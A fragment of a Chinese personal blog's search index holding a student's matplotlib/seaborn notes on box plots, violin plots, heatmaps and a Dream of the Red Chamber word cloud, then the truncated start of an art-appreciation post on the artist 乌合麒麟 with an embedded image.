src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_23.png"></p><p>从运行结果可以看出，x2数据有一个异常数据点，绘制在箱线图外部。</p><p>在进行数据预处理时，常常需要进行数据的异常值分析，来检测数据是否有错误和不合理的数据。异常值会影响整租数据，应该从本组数据中丢弃异常值。</p><p>例5-25：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'苹果'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'西瓜'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'桃'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"香蕉"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>box<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">"每种水果的销售额对比"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_24.png"></p><h2 id="5-9小提琴图"><a href="#5-9小提琴图" class="headerlink" title="5.9小提琴图"></a>5.9小提琴图</h2><p>小提琴图是用来展示多组数据的分布状态及概率密度的一种数据可视化形式。小提琴图结合了箱线图和密度图的特征，主要用来显示数据的分布形状，特别适用于大数据统计分析。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>normal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>violinplot<span class="token punctuation">(</span>data<span class="token punctuation">,</span>showmeans<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>showmedians<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_25.png"></p><h2 id="5-10热力图"><a href="#5-10热力图" class="headerlink" title="5.10热力图"></a>5.10热力图</h2><p>Seaborn是基于matplotlib库的Python可视化库， 它提供了一个高级界面来绘制有吸引力的统计图形。<br>Seaborn其实是在matplotlib的基础上进行了更高级的API封装，从而使作图更加容易，不需要经过大量的调整就能使图变得更精致。<br>绘图热力图是大数据分析应用的一种常用可视化形式，用来表示大量数据的关联关系。<br>在实际应用中，通常使用seaborn来绘制热力图。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">seaborn<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>data<span class="token punctuation">,</span> vmin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>cmap<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> robust<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> annot<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span>’<span class="token punctuation">.</span>2g’<span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>linewidths<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> linecolor<span class="token operator">=</span>’white’<span class="token punctuation">,</span> cbar<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> cbar_kws<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cbar_ax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>square<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span>’auto’<span class="token punctuation">,</span> yticklabels<span class="token operator">=</span>’auto’<span class="token punctuation">,</span> mask<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>热力图绘制属于Python绘图的中高级应用，在绘制前要先添加如下语句。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> seaborn <span class="token keyword">as</span> sns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例5-27：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'blue'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_26.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu_r"</span><span class="token punctuation">,</span> linewidths <span class="token operator">=</span> <span class="token number">0.05</span><span class="token punctuation">,</span> linecolor<span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">,</span> ax <span class="token operator">=</span> ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot"</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"OrRd"</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> yticklabels<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_27.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu_r"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'blue'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot_r"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_28.png"></p><h2 id="5-11云图"><a href="#5-11云图" class="headerlink" title="5.11云图"></a>5.11云图</h2><p>词云图是目前文本大数据分析中常用的一种数据可视化方式，通过词云图可以直观的看到相应数据文本中的高频词。目前制作词云图使用最多的是Python库中的wordcloud库，wordcloud库中有3个主要的函数，分别是<strong>wordcloud.Woedcloud()</strong>,<strong>wordcloud.ImageColorGenerator()<strong>及</strong>wordcloud.random_color_func()</strong></p><p>由于于老师没有给我，这些数据，我自己从网上下载了个txt格式的红楼梦，做了一下。</p><p><strong>matplotlib.pyplot</strong>模块用于绘图展示，<strong>jieba</strong>库用于分词，<strong>numpy</strong>模块和<strong>PIL.image</strong>模块用于制作背景图，<strong>re</strong>用于正则匹配，</p><p>注意<strong>PIL.image</strong>模块的真名是pillow,不要试图使用PIL之类的找到添加这个库。</p><pre class="line-numbers language-none"><code class="language-none">pip install pillow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> jieba<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 要先pip install wordcloud</span><span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordCloud<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagef <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"红楼梦.txt"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>file_handle <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'红楼梦去字符.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>line <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">u'[\u4e00-\u9fa5]+'</span><span class="token punctuation">)</span>b<span class="token operator">=</span>a<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>line<span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_handle<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>file_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"红楼梦去字符.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>words <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>f<span class="token punctuation">)</span>  <span class="token comment"># 使用精确模式对文本进行分词</span>counts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 通过键值对的形式存储词语及其出现的次数</span><span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 单个汉字不计算在内</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        counts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> counts<span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 遍历所有词语，每出现一次其对应的值加 1</span>lists <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将键值对转换成列表</span>lists<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 根据词语出现的次数进行从大到小排序</span><span class="token comment">#file=open("./333.txt","w",encoding="utf")</span><span class="token comment">#for i in range(len(lists)):</span><span class="token comment">#    word,count=lists[i]</span><span class="token comment">#    print("&#123;0:&lt;5&#125;&#123;1:>5&#125;".format(word, count))</span><span class="token comment">#    file.write(word+f'&#123;count&#125;')</span><span class="token comment">#这一部分我是想把所有的词语都导出了写到333.txt里面，之后可能会有用</span><span class="token comment">#file.close()</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./红楼梦词频统计.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf"</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'词语       次数\n'</span></span><span class="token punctuation">)</span><span class="token comment">#在这里先写入表头</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span> count <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>word <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'       </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span> count <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment">#for循环输出频率前100的</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;5&#125;&#123;1:>5&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'红楼梦词频统计.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#fit_word函数，接受字典类型，其他类型会报错</span>dic<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过PIL库设置背景图片</span>bg<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"城市.png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#当使用PlL.Image.open()打开图片后，如果要使用函数，需要先将image形式转换成array数组,这里是由于两个数组存储顺序不一致，</span>wordcloud <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>font_path<span class="token operator">=</span><span class="token string">'simhei.ttf'</span><span class="token punctuation">,</span>mask<span class="token operator">=</span>bg<span class="token punctuation">,</span>background_color<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fit_words<span class="token punctuation">(</span>dic<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wordcloud<span class="token punctuation">)</span><span class="token comment"># 显示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_29.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>艺术鉴赏</title>
      <link href="/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/"/>
      <url>/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/</url>
      
        <content type="html"><![CDATA[<h2><center>掷地有声——乌合麒麟</center></h2>​    其实打开这个话题我，也没有很大的把握，我也并不很清楚乌合麒麟的画作，究竟算不算艺术，究竟是什么风格？抱着懂与不懂的疑惑，我还是决定打开这个话题。我谨从乌合麒麟的《神明改造》推开来谈一下这个话题。<img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcH%0ABw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/%0A2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e%0AHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAFAAfQDAREAAhEBAxEB/8QA%0AHQAAAgMBAQEBAQAAAAAAAAAABAUDBgcCAQAICf/EAE0QAAIBAwMCBAMFBQQH%0ABQcEAwECAwAEEQUSIQYxE0FRYQcicRQygZGhI0KxwdEIFVLwFjNicpKy4UOC%0AosLxJDREU2Nz0hclVIN0k+L/xAAbAQACAwEBAQAAAAAAAAAAAAABAgADBAUG%0AB//EADsRAAICAQMCBAMHBAEEAgIDAAABAhEDBCExEkEFEyJRYXGBFDKRobHR%0A8CNCweEGFTNS8UNiJCWSorL/2gAMAwEAAhEDEQA/APxtUIeioE+qEPgKhKOk%0AwKFho9389qIK3Nn+B2hG705ZlU757qOEccc5JP8Ay1lzS5L4w2P27rkNvp3w%0ANu7XQXvZQunskEtopMu5jywxzwSSfpVOGliuXJTJeqj8Havmx1K5W6nje4Mp%0A8X5twyGOcHzrZD1RVCNFevbhpW35IGeMcYFWIhBFLL/jY59+alEJRKwAU4J8%0A8UKJZ0ZfLbUolnwYAHOeahCS3smmfeD8nmaEpUPCHUF7FBCRgEdjjuKr+Za/%0AgQyGFG7l2xg4PFXRxSluUyyRRMoGASFBP1JodAeo6YDPzArnsfWp0slo9aNW%0AwDyPWlQHuTW0RU98rTJitB0K9qYgwtx24ohGlouSv1FQgRGuZmI/xGgMMbZe%0ABRCNbdCoUnHPbmgOkNbLy4oMNDi17jilCNYGBfKrtGeB3xRINrNtrA4B9jUE%0AY0tmziiJIZWxwQaJW+BpbnGKJUxhbnIHHPrQFGdsMKCaVkDbUbnz5CoFIKc4%0AGKITl8hB71GBg7bQxzz+NAU5hcL9zA+gqBSO5HLc1GMQyHg54FQgquiBLgZJ%0A8gOaJAaaC4ePcIcL6txU6kFC3UYJYULOcAcYUVE7LEMullH2TcefmPfy5FRl%0AU+QLqHm0kOB98f8AWow4vvC7pyTbrVvk8C4X9eKHYsmisa18mo3EWF+WVufO%0ApyXx4FshFEcgc1CELYDAkZGeR61CEExDMcDHoKBAWYeVAgHN2oi0ATnuaZEA%0AZWw24AEj1HFQWwCc5zk0RWLp6grF10rKxDDBqEAJEdywRSxAJOPSoQBcHdwK%0AgaMeNKA+xUIe4NQJ8CfSoSzrIoUFM+C80Bkj9DfBZ57XTbIQcJHbT3j4H7wz%0AGn/iAqlxT5NMd